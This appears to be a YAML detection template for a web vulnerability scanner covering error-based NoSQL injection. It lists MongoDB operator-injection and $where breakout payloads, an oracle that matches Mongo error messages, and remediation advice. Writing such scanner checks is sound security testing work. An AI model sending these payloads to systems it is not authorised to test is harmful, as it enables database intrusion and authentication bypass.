id: nosqli-error
name: NoSQL Injection (error-based)
family: nosqli
severity: high
cwe: CWE-943
owasp: WSTG-INPV-05
cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
inject_into: [query, body, json]
payloads:
  - "'"
  - '{"$ne": null}'
  - "[$ne]="
  - "', $where: '1==1"
# Tried only when the planner marks nosqli a priority (e.g. a Node/Mongo stack). More operator- and
# type-confusion forms, so a driver that mis-parses one of them surfaces a Mongo/BSON/Cast error — which
# the SAME error-based oracle below confirms. Data forms, not operators, so no query actually runs here.
intensive_payloads:
  - "[$gt]="                       # query-string operator injection (?key[$gt]=)
  - "[$regex]=.*"                  # regex operator via query string
  - '{"$gt": ""}'                  # always-true comparison operator
  - '{"$where": "1"}'              # server-side JS predicate -> "$where" / unknown-operator error
  - "'; return true; //"           # break out of a $where JS string
oracle:
  type: any_of
  checks:
    - type: response_match
      part: body
      patterns:
        - "MongoError"
        - "unknown top level operator"
        - "\\$where"
        - "CastError"
        - "BSONError"
        - "MongoNetworkError"
confirm_reproducible: true
remediation: >-
  Treat user input as data, not as query operators. Validate and cast types, reject
  keys beginning with '$', and use the driver's parameterized query building instead
  of constructing filters from raw request input.
